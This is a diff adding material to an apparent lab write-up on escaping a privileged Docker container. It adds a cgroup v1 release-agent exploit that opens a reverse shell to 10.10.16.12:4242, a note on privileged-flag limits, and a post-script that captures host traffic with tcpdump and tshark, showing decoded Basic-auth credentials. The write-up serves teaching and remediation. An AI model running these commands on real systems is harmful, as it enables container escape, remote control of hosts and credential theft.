@@ -285,9 +285,22 @@ chmod a+x /exploit
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
+*Note: You can also try [Alex Chapman's release-agent exploit](https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html), an alternative which uses PID brute-forcing in cases where you can't access the underlying filesystem.*
+
 This is a blind attack, which means we won't get any explicit feedback. If successful it would execute the script at `/exploit`. In this case, it will copy the contents of a file (`flag.txt`) from a user's home folder on the host system to a target location in the container.
 
 However, the biggest flaw in the release agent model is that an attacker can author it to perform arbitrary commands. Instead of exfiltration, this could remove or encrypt (ransomware) sensitive files on the host. It could also be used to transfer files to the host, such as the attacker's SSH keys.
+
+Finally, if cgroup v1 is your *only* attack vector for escaping the container, you could abuse it to launch a reverse shell, which provides a direct connection to the host:
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+echo "#!/bin/sh" > /exploit
+echo "bash -c 'bash -i >& /dev/tcp/10.10.16.12/4242 0>&1'" > /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
 
 If you were trying to recreate this lab in your own VM, you would likely want an environment that supported this hybrid, so you could achieve the release-agent exploit. Of course, newer Linux distros have moved away from v1 entirely, and therefore no longer support cgroups release agents. If this were Ubuntu 21.10 or higher, that exploit would fail.
 
@@ -322,6 +335,8 @@ In retrospect, this "context" is interesting. One one hand, it's easy to appreci
 
 Perhaps, the authors had originally intended for Docker *not* to be exposed via its TCP socket. In that case, the privileged container becomes the bigger attack vector. Attacks against SSH or any other services running on that container become prime targets and the prerequisite to the campaign against the host machine.
 
+Another interesting constraint here is that a "privileged" container, in itself, is not necessarily susceptible to as brutal of attacks. In fact, the `--privileged` flag without other misconfigurations (using the host PID, mounting the Docker scoket, exposing the Docker daemon, etc.) could really only abuse the release-agent escape or the host-filesystem mount. This is still very abuseable, but will take more work compared to the environment we explored.
+
 Most of the tactics used here are also laid out in this [HackTricks cheat sheet](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation). The difference is that, with an eye towards DevSecOps, we want to understand what the environment is and what it is supposed to do. That way, you can provide and plan  meaningful remediations that are relevant with respect to the system's purpose.
 
 # Recommendations
@@ -344,4 +359,126 @@ Without those two protections, we abused the daemon and got RCE pretty quickly, 
 The intended purpose of this system is still a bit of a mystery. The daemon over TCP, coupled with the privileged container, seems redundant, and sends an unclear message about its use cases. Each case could, on its own, serve the needs of container orchestration or CI/CD pipelines, albeit with its own caveats and security considerations; TCP via key-based TLS or SSH may be the better route.
 
 Or, they could use something else. *Anything* else.
+
+# Post-script
+
+Start the capture, generate some traffic on the host, and end the capture when you're ready:
+```
+root@ubuntu:~# tcpdump -i enp0s5 -w capture.pcap
+tcpdump: listening on enp0s5, link-type EN10MB (Ethernet), capture size 262144 bytes
+^C100 packets captured
+101 packets received by filter
+0 packets dropped by kernel
+```
+
+You can then inspect the capture file for any interesting traffic made by the host, including sites, objects, and passwords. For example, snooping unencrypted HTTP traffic:
+
+```
+root@ubuntu:~# tshark -r capture.pcap -O http -Y http
+...
+Frame 45: 130 bytes on wire (1040 bits), 130 bytes captured (1040 bits)
+Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: Parallel_00:00:18 (00:1c:42:00:00:18)
+Internet Protocol Version 4, Src: 10.211.55.18, Dst: 34.223.124.45
+Transmission Control Protocol, Src Port: 34910, Dst Port: 80, Seq: 1, Ack: 1, Len: 76
+Hypertext Transfer Protocol
+    GET / HTTP/1.1\r\n
+        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
+            [GET / HTTP/1.1\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Request Method: GET
+        Request URI: /
+        Request Version: HTTP/1.1
+    Host: neverssl.com\r\n
+    User-Agent: curl/7.68.0\r\n
+    Accept: */*\r\n
+    \r\n
+    [Full request URI: http://neverssl.com/]
+    [HTTP request 1/1]
+
+Frame 51: 1419 bytes on wire (11352 bits), 1419 bytes captured (11352 bits)
+Ethernet II, Src: Parallel_00:00:18 (00:1c:42:00:00:18), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
+Internet Protocol Version 4, Src: 34.223.124.45, Dst: 10.211.55.18
+Transmission Control Protocol, Src Port: 80, Dst Port: 34910, Seq: 2897, Ack: 77, Len: 1365
+[3 Reassembled TCP Segments (4261 bytes): #47(1460), #48(1436), #51(1365)]
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
+            [HTTP/1.1 200 OK\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Response Version: HTTP/1.1
+        Status Code: 200
+        [Status Code Description: OK]
+        Response Phrase: OK
+    Date: Sat, 07 Sep 2024 10:44:59 GMT\r\n
+    Server: Apache/2.4.58 ()\r\n
+    Upgrade: h2,h2c\r\n
+    Connection: Upgrade\r\n
+    Last-Modified: Wed, 29 Jun 2022 00:23:33 GMT\r\n
+    ETag: "f79-5e28b29d38e93"\r\n
+    Accept-Ranges: bytes\r\n
+    Content-Length: 3961\r\n
+        [Content length: 3961]
+    Vary: Accept-Encoding\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.094416000 seconds]
+    [Request in frame: 45]
+    [Request URI: http://neverssl.com/]
+    File Data: 3961 bytes
+Line-based text data: text/html (131 lines)
+
+Frame 77: 184 bytes on wire (1472 bits), 184 bytes captured (1472 bits)
+Ethernet II, Src: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5), Dst: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64)
+Internet Protocol Version 4, Src: 10.211.55.18, Dst: 10.211.55.2
+Transmission Control Protocol, Src Port: 37572, Dst Port: 80, Seq: 1, Ack: 1, Len: 118
+Hypertext Transfer Protocol
+    GET / HTTP/1.1\r\n
+        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
+            [GET / HTTP/1.1\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Request Method: GET
+        Request URI: /
+        Request Version: HTTP/1.1
+    Host: 10.211.55.2\r\n
+    Authorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n
+        Credentials: admin:password
+    User-Agent: curl/7.68.0\r\n
+    Accept: */*\r\n
+    \r\n
+    [Full request URI: http://10.211.55.2/]
+    [HTTP request 1/1]
+
+Frame 82: 95 bytes on wire (760 bits), 95 bytes captured (760 bits)
+Ethernet II, Src: ca:89:f3:2d:4f:64 (ca:89:f3:2d:4f:64), Dst: Parallel_ed:f6:f5 (00:1c:42:ed:f6:f5)
+Internet Protocol Version 4, Src: 10.211.55.2, Dst: 10.211.55.18
+Transmission Control Protocol, Src Port: 80, Dst Port: 37572, Seq: 174, Ack: 119, Len: 29
+[2 Reassembled TCP Segments (202 bytes): #80(173), #82(29)]
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+        [Expert Info (Chat/Sequence): HTTP/1.1 200 OK\r\n]
+            [HTTP/1.1 200 OK\r\n]
+            [Severity level: Chat]
+            [Group: Sequence]
+        Response Version: HTTP/1.1
+        Status Code: 200
+        [Status Code Description: OK]
+        Response Phrase: OK
+    Server: Werkzeug/3.0.1 Python/3.11.9\r\n
+    Date: Sat, 07 Sep 2024 10:45:02 GMT\r\n
+    Content-Type: text/html; charset=utf-8\r\n
+    Content-Length: 29\r\n
+        [Content length: 29]
+    Connection: close\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.005050000 seconds]
+    [Request in frame: 77]
+    [Request URI: http://10.211.55.2/]
+    File Data: 29 bytes
+Line-based text data: text/html (1 lines)
+```
 
